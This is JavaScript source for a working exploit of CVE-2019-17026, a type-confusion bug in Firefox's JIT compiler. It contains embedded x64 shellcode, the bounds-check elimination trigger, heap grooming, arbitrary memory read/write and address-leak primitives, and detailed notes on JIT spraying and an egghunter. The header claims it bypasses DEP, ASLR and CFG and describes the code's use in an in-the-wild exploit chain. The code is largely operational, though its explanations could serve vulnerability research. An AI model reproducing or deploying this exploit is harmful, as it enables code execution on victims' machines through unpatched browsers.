/*;; --------------------------------------------------------------------- |
;;;; CVE-2019-17026 - Firefox 64-bit JIT Aliasing Type Confusion           |
;;;; --------------------------------------------------------------------- |
;;;; Author: deadlock (Forrest Orr) - 2021                                 |
;;;; --------------------------------------------------------------------- |
;;;; Licensed under GNU GPLv3                                              |
;;;; --------------------------------------------------------------------- |
;;;; Tested on Windows 10 x64 with Firefox 65-69 64-bit                    |
;;;; https://ftp.mozilla.org/pub/firefox/releases/69.0.1/                  |
;;;; --------------------------------------------------------------------- |
;;;; Bypasses: DEP, High Entropy ASLR, CFG                                 |
;;;; --------------------------------------------------------------------- |
;;;; ## Sandboxing                                                         |
;;;;  ~ Firefox executes JavaScript in the context of a renderer child     |
;;;;    process in a Low Integrity AppContainer, isolated from the network |
;;;;    the UI and the majority of the file system and registry.           |
;;;;  ~ Due to isolation from the UI, a MessageBox shellcode will not run  |
;;;;    correctly and neither will WinExec due to a child process creation |
;;;;    quota which inhibits the renderer process from launching new       |
;;;;    new processes.                                                     |
;;;;  ~ For testing of either of these payloads go to "about:config" and   |
;;;;    set the security.content.sandbox.level from 5 to 2.                |
;;;;  ~ This exploit is part of the Double Star exploit chain and utilized |
;;;;    the Jscript.dll UAF CVE-2020-0674 over RPC to the WPAD service for |
;;;;    a sandbox escape in the wild.  You can find my full implementation |
;;;;    of the exploit chain at: https://github.com/forrest-orr/DoubleStar |
;;;; --------------------------------------------------------------------- |
;;;; ## Notes                                                              |
;;;;  ~ Due to specific issues with heap grooming, this particular variant |
;;;;    of CVE-2019-17026 only works on versions of Firefox up to FF 69    |
;;;;    even though the bug was not fixed until FF 72 and is still         |
;;;;    technically exploitable on FF 70 and 71.                           |
;;;;  ~ I used a JIT spray/egg hunter design in my implementation of this  |
;;;;    exploit for code execution. The egghunter is encoded in an array   |
;;;;    double floats within the JITSprayFunc() in this source file. Its   |
;;;;    x64 ASM source code can be found at the Github link in the         |
;;;;    aforementioned function definition.                                |
;;;;  ~ The egghunter which is JIT sprayed and executed by this exploit    |
;;;;    will scan through all committed +RW regions of private memory      |
;;;;    within the compromised firefox.exe renderer process and mark any   |
;;;;    region it identifies as +RWX which contains the egg QWORD bytes    |
;;;;    and subsequentially execute it via a CALL instruction.             |
;;;;  ~ Shellcode used within this exploit should be encoded as a Uint8    |
;;;;    array prefixed by the following egg QWORD bytes:                   |
;;;;    0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88                     |
;;;; --------------------------------------------------------------------- |
;;;; ## Credits                                                            |
;;;;  ~ 0vercl0k - for documenting IonMonkey internals in relation to      |
;;;;    aliasing and the GVN.                                              |
;;;;  ~ maxpl0it - for writing the initial analysis and PoC for            |
;;;;    CVE-2019-17026 with a focus on the Linux OS.                       |
;;;; -------------------------------------------------------------------- */

const Shellcode = new Uint8Array([ 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0x90, 0x48, 0xc7, 0xc1, 0x88, 0x4e, 0x0d, 0x00, 0x90, 0xe8, 0x81, 0x00, 0x00, 0x00, 0x90, 0x48, 0x89, 0xc7, 0x48, 0xc7, 0xc2, 0xea, 0x6f, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0xcd, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00, 0x48, 0xb9, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00, 0x51, 0x48, 0xb9, 0x57, 0x53, 0x5c, 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x51, 0x48, 0xb9, 0x43, 0x3a, 0x5c, 0x57, 0x49, 0x4e, 0x44, 0x4f, 0x51, 0x48, 0x89, 0xe1, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0x48, 0xc7, 0xc2, 0xbc, 0x1a, 0x00, 0x00, 0x48, 0x89, 0xf9, 0xe8, 0x7d, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc1, 0xff, 0xff, 0xff, 0xff, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xec, 0x08, 0x40, 0x80, 0xe4, 0xf7, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x41, 0x50, 0x57, 0x56, 0x49, 0x89, 0xc8, 0x48, 0xc7, 0xc6, 0x60, 0x00, 0x00, 0x00, 0x65, 0x48, 0xad, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x78, 0x30, 0x48, 0x89, 0xfe, 0x48, 0x31, 0xc0, 0xeb, 0x05, 0x48, 0x39, 0xf7, 0x74, 0x34, 0x48, 0x85, 0xf6, 0x74, 0x2f, 0x48, 0x8d, 0x5e, 0x38, 0x48, 0x85, 0xdb, 0x74, 0x1a, 0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x08, 0x48, 0x85, 0xc9, 0x74, 0x0a, 0xe8, 0xae, 0x01, 0x00, 0x00, 0x4c, 0x39, 0xc0, 0x74, 0x08, 0x48, 0x31, 0xc0, 0x48, 0x8b, 0x36, 0xeb, 0xcb, 0x48, 0x8b, 0x46, 0x10, 0x5e, 0x5f, 0x41, 0x58, 0xc3, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x50, 0x02, 0x00, 0x00, 0x57, 0x56, 0x48, 0x89, 0x4d, 0xf8, 0x48, 0x89, 0x55, 0xf0, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x3c, 0x48, 0x01, 0xd9, 0x48, 0x83, 0xc1, 0x18, 0x48, 0x8b, 0x75, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x59, 0x70, 0x48, 0x01, 0xde, 0x48, 0x89, 0x75, 0xe8, 0x8b, 0x41, 0x74, 0x89, 0x45, 0xc0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x20, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x48, 0x31, 0xdb, 0x8b, 0x5e, 0x24, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd8, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x5e, 0x1c, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x31, 0xf6, 0x48, 0x89, 0x75, 0xc8, 0x48, 0x8b, 0x45, 0xe8, 0x8b, 0x40, 0x18, 0x48, 0x39, 0xf0, 0x0f, 0x86, 0x10, 0x01, 0x00, 0x00, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xc1, 0xe8, 0xf7, 0x00, 0x00, 0x00, 0x3b, 0x45, 0xf0, 0x0f, 0x85, 0xda, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x14, 0x00, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x0f, 0xb7, 0x04, 0x02, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xd0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xc8, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x89, 0xca, 0x48, 0x31, 0xdb, 0x8b, 0x5d, 0xc0, 0x48, 0x01, 0xda, 0x48, 0x39, 0xc8, 0x0f, 0x8c, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x39, 0xd0, 0x0f, 0x8d, 0x97, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x90, 0x48, 0x8d, 0x9d, 0xb0, 0xfd, 0xff, 0xff, 0x8a, 0x14, 0x08, 0x80, 0xfa, 0x00, 0x74, 0x2f, 0x80, 0xfa, 0x2e, 0x75, 0x20, 0xc7, 0x03, 0x2e, 0x64, 0x6c, 0x6c, 0x48, 0x83, 0xc3, 0x04, 0xc6, 0x03, 0x00, 0xeb, 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x8d, 0x9d, 0xb0, 0xfe, 0xff, 0xff, 0x48, 0xff, 0xc1, 0xeb, 0xd3, 0x88, 0x13, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc3, 0xeb, 0xc9, 0xc6, 0x03, 0x00, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfd, 0xff, 0xff, 0xe8, 0x46, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xe8, 0x47, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x2e, 0x48, 0x89, 0x45, 0xb8, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfe, 0xff, 0xff, 0xe8, 0x26, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc2, 0x48, 0x8b, 0x4d, 0xb8, 0xe8, 0x82, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc8, 0xeb, 0x09, 0x48, 0xff, 0xc6, 0x90, 0xe9, 0xe0, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x45, 0xc8, 0x5e, 0x5f, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x57, 0x48, 0x89, 0xd7, 0x48, 0x31, 0xdb, 0x80, 0x39, 0x00, 0x74, 0x1a, 0x0f, 0xb6, 0x01, 0x0c, 0x60, 0x0f, 0xb6, 0xd0, 0x01, 0xd3, 0x48, 0xd1, 0xe3, 0x48, 0xff, 0xc1, 0x48, 0x85, 0xff, 0x74, 0xe6, 0x48, 0xff, 0xc1, 0xeb, 0xe1, 0x48, 0x89, 0xd8, 0x5f, 0xc3,  ]);
const JITIterations = 10000; // Number of iterations needed to trigger JIT compilation of code. The compilation count threshold varies and this is typically overkill (10+ or 1000+ is often sufficient) but is the most stable count I've tested.
var HelperBuf = new ArrayBuffer(8);
var HelperDbl = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);
const EnableDebug = false;
const AlertOutput = false;

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

/*//////
////////
// MIR Boundscheck elimination bug/OOB array logic
////////

This is the primary logic exploiting the vulnerability itself. Fundamentally
CVE-2019-17026 is an aliasing bug in the IonMonkey JIT engine: an overly
strict aliasing type criteria can cause a potentially dangerous node such as
MStoreElementHole to be discarded as a STORE dependency for a sensitive LOAD
node such as MBoundsCheck. Thus in the event that a similar MBoundsCheck has
already been declared within a JIT'd function, we can trick IonMonkey into
believing these instructions to be congruent which will result in the
elimination of the second MBoundsCheck by the GVN due to congruence rules:
- LOAD instructions may be tied to their most recent STORE instruction as
  dependencies during the aliasing phase of JIT compilation.
- After the aliasing phase comes the GVN phase, which eliminates redundant
  nodes via congruence rules for optimization purposes.
- In order for two matching nodes (such as two boundschecks) to be considered
  for redundancy elimination via congruence rules they must have matching
  STORE dependencies.
- In a secure engine (such as FF 72+) the MStoreElementHole node will ALWAYS
  be aliased to its following LOAD instruction regardless of whether operand
  types are perfectly matching. This will result in a boundscheck following
  an MStoreElementHole ALWAYS considering it to be a dependency and thus
  never resulting in boundscheck elimination.
- In an insecure engine (such as being exploited here) the MStoreElementHole
  node will only be aliased to a following MBoundsCheck node if the two meet
  operand type criteria.
- MStoreElementHole can be manipulated into acting upon a different operand
  type through use of a global sparse array. This will cause MBoundsCheck
  (which is acting upon a constant array object) to have a different operand
  type and thus thwart aliasing by IonMonkey.
- MStoreElementHole can also be used to trigger side-effects, such as setting
  the length field of an array to 0 and heap grooming to prepare for an OOB
  access to this array.
- As a result we may modify the .length field of an array prior to accessing
  it at an arbitrary index despite the boundscheck no longer existing.
  
The following code demonstrates the bug:

BugArray[Index] = 4.2;
SideEffectArray[SideEffectIndex] = 2.2;
BugArray[Index] = DblVal;

IonMonkey will produce nodes corresponding to these instructions:

MBoundsCheck
MStoreElement

MBoundsCheck
MStoreElementHole  <- This node may trigger side-effects

MBoundsCheck       <- This node will be eliminated by the optimizer
MStoreElement      <- This node will be used for the OOB array R/W

Due to BugArray[Index] having already been declared (and the boundscheck
executed) IonMonkey will eliminate the third boundscheck node. This allows us
to use the side-effect triggered by MStoreElementHole to set the modify the
BugArray1.length field and perform heap grooming prior to the final BugArray
access.

The anatomy of an Array involves two data structures: a NativeObject which holds
the primary pointers relating to the Array element data, property types, etc.

struct NativeObject {
    void *GroupPtr;
    void *ShapePtr;
    void *SlotsPtr;
    void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
}

Followed by an element metadata struct which holds data pertaining to the length,
capacity and initialization size of the elements data itself:

struct ElementsMetadata {
    uint32_t Flags;
    uint32_t InitializedLength; // The number of elements actually initialized (will be 0 when Array first declared). If you do Array(50) then set index 20 to something, the length will become 20 (and 0-19 will be allocated but marked uninitialized).
    uint32_t Capacity; // Storage allocated for the array
    uint32_t Length; // The literal .length property. Thus Array(50) even though it has an initialized length and capavity of 0 would have a length of 50.
    // ...
}

Followed finally by the actual element data of the array, which is pointed to
by the NativeObject.ElementsPtr.

The bug is converted into exploit primitives R/W/AddressOf by setting up 3
arrays in memory prior to executing the JIT bug:

BugArray = new Array(0x20);
CorruptedArray = new Array(0x20);
MutableArray = new Array(0x20);

This will eventually result in the following memory layout in the nursery heap:

[BugArray.NativeObject][BugArray.ElementsMetadata][Element data][CorruptedArray.NativeObject][CorruptedArray.ElementsMetadata][Element data][MutableArray.NativeObject][MutableArray.ElementsMetadata][Element data]

Thus the OOB array access (via the JIT bug) will be used on BugArray to overwrite
CorruptedArray.ElementsMetadata. Subsequently, CorruptedArray may be used to make OOB R/W
at will (without the need to repeat the JIT bug) and overwrite the 
MutableArray.NativeObject in order to build the primitives for the remainer of
the exploit.

Prior to doing this, it is essential to do some heap grooming to prepare for the
OOB array access from BugArray to corrupt CorruptedArray.ElementsMetadata. Re-visiting
the vulnerable JS code:

BugArray[Index] = 4.2;
SideEffectArray[SideEffectIndex] = 2.2;
BugArray[Index] = DblVal;

Access to the SideEffectArray may be used to trigger some arbitrary code of our
choice prior to the second (vulnerable/no boundscheck) BugArray access. This
is used to set the .length field of the BugArray, CorruptedArray and MutableArray
arrays to zero and trigger the garbage collector. After doing so, these three
arrays will appear on the nursery heap as follows:

000000000B5BF100  000000000B5A5A60  <- BugArray.NativeObject
000000000B5BF108  000000000B5C21C8 
000000000B5BF110  0000000000000000  
000000000B5BF118  000000000B5BF130  <- BugArray.NativeObject.ElementsPtr
000000000B5BF120  0000000000000000  <- BugArray.ElementsMetadata
000000000B5BF128  0000000000000006  
000000000B5BF130  FFFA800000000000  <- BugArray raw element data
000000000B5BF138  FFFA800000000000  
000000000B5BF140  FFFA800000000000  
000000000B5BF148  FFFA800000000000  
000000000B5BF150  FFFA800000000000  
000000000B5BF158  FFFA800000000000  
000000000B5BF160  000000000B5A5A90  <- CorruptedArray.NativeObject
000000000B5BF168  000000000B5C21C8  
000000000B5BF170  0000000000000000  
000000000B5BF178  000000000B5BF190  
000000000B5BF180  0000007E00000000  <- Overwritten CorruptedArray.ElementsMetadata (note QWORD index 10 from the start of BugArray.NativeObject.ElementsPtr)
000000000B5BF188  0000007E0000007E  
000000000B5BF190  0000000000000000  <- CorruptedArray raw element data
000000000B5BF198  0000000000000000  
000000000B5BF1A0  0000000000000000  
000000000B5BF1A8  0000000000000000  
000000000B5BF1B0  0000000000000000  
000000000B5BF1B8  0000000000000000  
000000000B5BF1C0  000000000B5A5AC0  <- MutableArray.NativeObject
000000000B5BF1C8  000000000B5C21C8 
000000000B5BF1D0  0000000000000000  
000000000B5BF1D8  000000000B5BF1F0  
000000000B5BF1E0  0000000000000000  <- MutableArray.ElementsMetadata
000000000B5BF1E8  0000000000000006  
000000000B5BF1F0  0000000000000000  <- MutableArray raw element data
000000000B5BF1F8  0000000000000000  
000000000B5BF200  0000000000000000  

This layout is then used in conjunction with the JIT bug to begin the array
corruption.
*/

// Note that these arrays cannot be declared as vars
SideEffectArray = [1.1, 1.2, , 1.4]; // MStoreElementHole access to a global sparse array is the unique edge case causes aliasing with MBoundsCheck to fail due to operand type mismatch
BugArray = new Array(0x20); // This array will be used (after heap grooming) to make the OOB overwrite of CorruptedArray.ElementsMetadata. The heap grooming requires the .length be set to 0, but the length will not matter due to boundscheck elimination (the capacity however still will).
CorruptedArray = new Array(0x20); // This array will be used to read and set pointers reliably and repeatably in MutableArray
MutableArray = new Array(0x20); // The NativeObject of this array are corrupted to build the exploit primitives

SideEffectArray.__defineSetter__("-1", function(x) { // Side effects called for OOB SideEffectArray access at index -1
    // Key to understand here is that setting these lengths to 0 and having GC manipulate them into pointing at each other could be done without the boundscheck elimination bug. The boundscheck elimination bug however is what allows them to actually access each other, as it is necessary to set .length to 0 to do the GC trick and the boundschecks are based on .length. Note that access to all of these arrays will still be limited by their capacity metadata field despite elimination of their .length boundscheck.
    BugArray.length = 0;
    CorruptedArray.length = 0;
    MutableArray.length = 0;
    GC();
});

function GC() { // Call the GC - Phoenhex function
    BufSize = (128 * 1024 * 1024); // 128MB
    
    for(var i = 0; i < 3; i++) {
        var x = new ArrayBuffer(BufSize); // Allocate locally, but don't save
    }
}

function BuggedJITFunc(SideEffectIndex, Index, DblVal) {
    // Removes future bounds checks with GVN
    
    BugArray[Index] = 4.2;
    BugArray[Index - 1] = 4.2;

    // Triggers the side-effect function when a -1 index provided
    
    SideEffectArray[SideEffectIndex] = 2.2;

    // Write OOB and corrupt CorruptedArray.ElementsMetadata. Normally boundscheck would prevent this based on .length. Note that despite the bugged elimination of this check, access is still limited to the BugArray.ElementsMetadata capacity metadata field.
    
    BugArray[Index] = DblVal; // Corrupt the CorruptedArray.ElementsMetadata capacity and length element metadata - 0x7e 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
    BugArray[Index - 1] = 2.673714696616e-312; // Corrupt the CorruptedArray.ElementsMetadata flags and initialized length element metadata - 0x00 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
}

for(var i = 0; i < JITIterations; i++) {
    SideEffectArray.length = 4; // Reset the length so that StoreElementHole node is used
    BuggedJITFunc(5, 11, 2.67371469724e-312);
}

// Call the JIT'd bugged function one more time, this time with an OOB write index of -1. There is substantial significance to using -1 as opposed to some other (larger) index which would still go OOB and trigger a side effect. The reason being that -1 is considered an "invalid index" (not just an OOB index) and is treated differently. OOB writes to the SideEffectArray with valid albeit indexes which will fail the boundscheck restrictions and will not trigger useful side effects. The reason for this being that access to valid indexes will cause the creation of a MSetPropertyCache node in the MIR, a node which is not susceptible to the exploit condition. The MIR instruction chosen to handle the SideEffectArray OOB MUST be MStoreElementHole, and MStoreElementHole will only be selected in the event of an INVALID index access, not simply an OOB one.

SideEffectArray.length = 4; // Reset the length one more time
BuggedJITFunc(-1, 11, 2.67371469724e-312);

// Initialize mutable array properties for R/W/AddressOf primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

/*//////
////////
// Arbitrary read/write/address-of primitives
////////

~ Weak arbitrary read

8 bytes of data can be leaked from the address pointed to by the mutable array
NativeObject.SlotsPtr, as this address is interpreted as holding the value of
'x' (stored as a double). The drawback is that if the 8 bytes cannot be 
interpreted as a valid double, they may be interpreted as a pointer and
dereferenced. In this sense, some values may not be be readable with this
primitive.

~ Weak arbitrary write

In the same way that the 'x' property pointed at by the slots pointer can be
used to read doubles it can also be used to write doubles. The only drawback
being that the value being written must be a valid double.

~ Weak AddressOf

The mutable array slots pointer (in its native object struct) is going to be
pointing at an array of 3 property values (for x, y and z). Since we are
trying to leak the object address (which will be written into the property
array slots for x, y or z) as a double, this will cause issues as the JS engine
will (correctly) attempt to dereference this address rather than interpret it
as a double.

Thus the trick is to set the slots pointer in the mutable array native object
ahead by 4 bytes. This the result that the object address (previously only in
the "y" slot) can now be partially read (32-bits at a time) from both "x" and
"y" and that these values are now certain to be valid doubles.

We can ensure the resulting double is valid by using bitwise AND to filter off
the significant bits responsible for differentiating between a valid and
non-valid double.

~ Strong arbitrary read

This primitive solves the issue of attempting to read 8 bytes in memory which
may be invalid doubles and thus misinterpreted as pointers (for example if the
tagged pointer bits are set).

The solution is to simply create a double float array, and then overwrite its
data pointer to point to the precise region we want to read. The key concept
here is that it reduces the ambiguity on the part of the JS engine. Since the
JS engine knows that the value at this address is explicitly a double float,
it will not attempt to potentially interprete it as an object pointer even if
those tagged bits are set.
*/

/*//////
////////
// Exploit primitives
///////*/

function LeakSlotsPtr() {
    return CorruptedArray[8];
}

function SetSlotsPtr(NewSlotsPtrDbl) {
    CorruptedArray[8] = NewSlotsPtrDbl;
}

function WeakLeakDbl(TargetAddress) {
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    var LeakedDbl = MutableArray.x;
    SetSlotsPtr(SavedSlotsPtrDbl);
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) { 
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    SetSlotsPtr(TargetAddress);
    MutableArray.x = Val;
    SetSlotsPtr(SavedSlotsPtrDbl);
}

function WeakLeakObjectAddress(Obj) {
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    var SavedSlotsPtrDbl = LeakSlotsPtr();
    HelperDbl[0] = SavedSlotsPtrDbl;
    HelperDword[0] = HelperDword[0] + 4;
    SetSlotsPtr(HelperDbl[0]);
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    var LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    var LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    SetSlotsPtr(SavedSlotsPtrDbl);
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

var ExplicitDblArray = new Float64Array(1); // Used for the strong read
var ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function ExplicitLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

function InitStrongReadPrimitive() {
    var ExplicitDblArrayAddress = WeakLeakObjectAddress(ExplicitDblArray);
    HelperDbl[0] = ExplicitDblArrayAddress;
    HelperDword[0] = HelperDword[0] + 56; // Float64Array data pointer
    ExplicitDblArrayDataPtr = HelperDbl[0];
}

function GetJSFuncJITInfoPtr(JSFuncObj) {
    HelperDbl[0] = WeakLeakObjectAddress(JSFuncObj); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    var JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    HelperDbl[0] = JITInfoAddress;
    
    if(HelperDword[0] == 0x41414141) {
        DebugLog("Arbitrary read primitive failed");
        window.location.reload();
        return 0.0;
    }
    
    return JITInfoAddress;
}

function GetJSFuncJITCodePtr(JSFuncObj) {
    var JITInfoAddress = GetJSFuncJITInfoPtr(JSFuncObj);
    
    if(JITInfoAddress) {
        var JITCodePtr = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        return JITCodePtr;
    }
    
    return 0.0;
}
    
/*//////
////////
// JIT spray/egghunter shellcode logic
////////

JIT spray in modern Firefox 64-bit on Windows seems to behave very differently
when a special threshold of 100 double float constants are planted into a single
function and JIT sprayed. When more than 100 are implanted, the JIT code pointer
for the JIT sprayed function will look as follows:

00000087EB6F5280 | E9 23000000              | jmp 87EB6F52A8                   <- JIT code pointer for JIT sprayed function points here
00000087EB6F5285 | 48:B9 00D0F2F8F1000000   | mov rcx,F1F8F2D000                   
00000087EB6F528F | 48:8B89 60010000         | mov rcx,qword ptr ds:[rcx+160]       
00000087EB6F5296 | 48:89A1 D0000000         | mov qword ptr ds:[rcx+D0],rsp        
00000087EB6F529D | 48:C781 D8000000 0000000 | mov qword ptr ds:[rcx+D8],0          
00000087EB6F52A8 | 55                       | push rbp                             
00000087EB6F52A9 | 48:8BEC                  | mov rbp,rsp                          
00000087EB6F52AC | 48:83EC 48               | sub rsp,48                           
00000087EB6F52B0 | C745 E8 00000000         | mov dword ptr ss:[rbp-18],0          
...
00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141                 <- Note the first double float being loaded into RBX        
00000087EB6F5341 | 53                       | push rbx                             
00000087EB6F5342 | 49:BB D810EAFCF1000000   | mov r11,F1FCEA10D8                   
00000087EB6F534C | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F534F | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5351 | 48:83C4 08               | add rsp,8                            
00000087EB6F5355 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F535F | 49:BB E810EAFCF1000000   | mov r11,F1FCEA10E8                   
00000087EB6F5369 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F536C | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F536E | 48:BB 9090554889E54883   | mov rbx,8348E58948559090             
00000087EB6F5378 | 53                       | push rbx                             
00000087EB6F5379 | 49:BB F810EAFCF1000000   | mov r11,F1FCEA10F8              
00000087EB6F5383 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F5386 | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5388 | 48:83C4 08               | add rsp,8                            
00000087EB6F538C | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F5396 | 49:BB 0811EAFCF1000000   | mov r11,F1FCEA1108              
00000087EB6F53A0 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F53A3 | FF17                     | call qword ptr ds:[rdi]                              
...

Rather than implanting the double float constants into the JIT'd code region as
an array of raw constant data, the JIT engine has created a (very large) quantity
of code which manually handles each individual double float one by one (this code
goes on much further than I have pasted here). You can see this at:

00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141  

This is the first double float 5.40900888e-315 (the stage one shellcode egg)
being loaded into RBX, where each subsequent double is treated the same.

In contrast, any JIT sprayed function with less than 100 double floats yields
a substantially different region of code at its JIT code pointer:

000002C6944D4470 | 48:8B4424 20             | mov rax,qword ptr ss:[rsp+20]    <- JIT code pointer for JIT sprayed function points here
000002C6944D4475 | 48:C1E8 2F               | shr rax,2F                              
000002C6944D4479 | 3D F3FF0100              | cmp eax,1FFF3                           
000002C6944D447E | 0F85 A4060000            | jne 2C6944D4B28                         
...
000002C6944D4ACB | F2:0F1180 C00A0000       | movsd qword ptr ds:[rax+AC0],xmm0       
000002C6944D4AD3 | F2:0F1005 6D030000       | movsd xmm0,qword ptr ds:[2C6944D4E48]   
000002C6944D4ADB | F2:0F1180 C80A0000       | movsd qword ptr ds:[rax+AC8],xmm0       
000002C6944D4AE3 | F2:0F1005 65030000       | movsd xmm0,qword ptr ds:[2C6944D4E50]   
000002C6944D4AEB | F2:0F1180 D00A0000       | movsd qword ptr ds:[rax+AD0],xmm0       
000002C6944D4AF3 | F2:0F1005 5D030000       | movsd xmm0,qword ptr ds:[2C6944D4E58]   
000002C6944D4AFB | F2:0F1180 D80A0000       | movsd qword ptr ds:[rax+AD8],xmm0       
000002C6944D4B03 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                
000002C6944D4B0D | C3                       | ret                                     
000002C6944D4B0E | 90                       | nop                                     
000002C6944D4B0F | 90                       | nop                                     
000002C6944D4B10 | 90                       | nop                                     
000002C6944D4B11 | 90                       | nop                                     
000002C6944D4B12 | 90                       | nop                                     
000002C6944D4B13 | 90                       | nop                                     
000002C6944D4B14 | 90                       | nop                                     
000002C6944D4B15 | 90                       | nop                                     
000002C6944D4B16 | 49:BB 30B14E5825000000   | mov r11,25584EB130                      
000002C6944D4B20 | 41:53                    | push r11                                
000002C6944D4B22 | E8 C9C6FBFF              | call 2C6944911F0                        
000002C6944D4B27 | CC                       | int3                                    
000002C6944D4B28 | 6A 00                    | push 0                                  
000002C6944D4B2A | E9 11000000              | jmp 2C6944D4B40                         
000002C6944D4B2F | 50                       | push rax                                
000002C6944D4B30 | 68 20080000              | push 820                                
000002C6944D4B35 | E8 5603FCFF              | call 2C694494E90                        
000002C6944D4B3A | 58                       | pop rax                                 
000002C6944D4B3B | E9 85F9FFFF              | jmp 2C6944D44C5                         
000002C6944D4B40 | 6A 00                    | push 0                                  
000002C6944D4B42 | E9 D9C5FBFF              | jmp 2C694491120                         
000002C6944D4B47 | F4                       | hlt                                     
